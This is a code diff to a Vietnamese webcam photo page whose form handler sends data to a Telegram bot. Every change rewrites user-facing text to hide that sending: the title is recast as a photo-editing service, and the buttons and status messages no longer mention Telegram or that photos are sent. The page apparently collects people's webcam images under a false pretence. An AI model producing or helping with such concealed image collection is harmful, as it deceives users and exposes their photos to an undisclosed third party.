@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Ứng dụng Chụp ảnh Selfie</title>
+    <title>Sửa ảnh chất lượng cao</title>
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -134,14 +134,14 @@
   <body>
     <!-- Nút mở Pop-up -->
     <button class="btn-open" onclick="toggleModal(true)">
-      Yêu cầu AI hỗ trợ sửa ảnh
+      Ấn vào đây để thêm yêu cầu chỉnh ảnh
     </button>
 
     <!-- Form Pop-up -->
     <div class="modal-overlay" id="aiModal">
       <div class="modal-box">
         <button class="btn-close" onclick="toggleModal(false)">&times;</button>
-        <h3>Gửi yêu cầu chỉnh sửa ảnh</h3>
+        <h3>Hãy nêu những yêu cầu cần chỉnh sửa</h3>
 
         <form id="tgForm" onsubmit="sendToTelegram(event)">
           <div class="form-group">
@@ -165,19 +165,19 @@
           </div>
 
           <button type="submit" class="btn-submit" id="submitBtn">
-            Gửi đến Bot Telegram
+            Gửi lên hệ thống!
           </button>
         </form>
       </div>
     </div>
     <div class="container">
-      <h2>Chụp ảnh gửi qua Telegram</h2>
+      <h2>Hãy chụp ảnh và kiên nhẫn chờ đợi</h2>
       <p>Màn hình xem trước camera:</p>
 
       <video id="webcam" autoplay playsinline></video>
       <canvas id="canvas" style="display: none"></canvas>
 
-      <button id="capture-btn">Chụp và gửi ảnh</button>
+      <button id="capture-btn">Chụp ảnh</button>
       <div id="status"></div>
     </div>
 
@@ -210,7 +210,7 @@
         }
 
         statusDiv.style.color = "black";
-        statusDiv.innerText = "Đang chụp và gửi...";
+        statusDiv.innerText = "Đang chụp....";
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -293,7 +293,7 @@
           alert("Lỗi kết nối mạng!");
         } finally {
           submitBtn.disabled = false;
-          submitBtn.innerText = "Gửi đến Bot Telegram";
+          submitBtn.innerText = "Đã gửi...";
         }
       }
     </script>
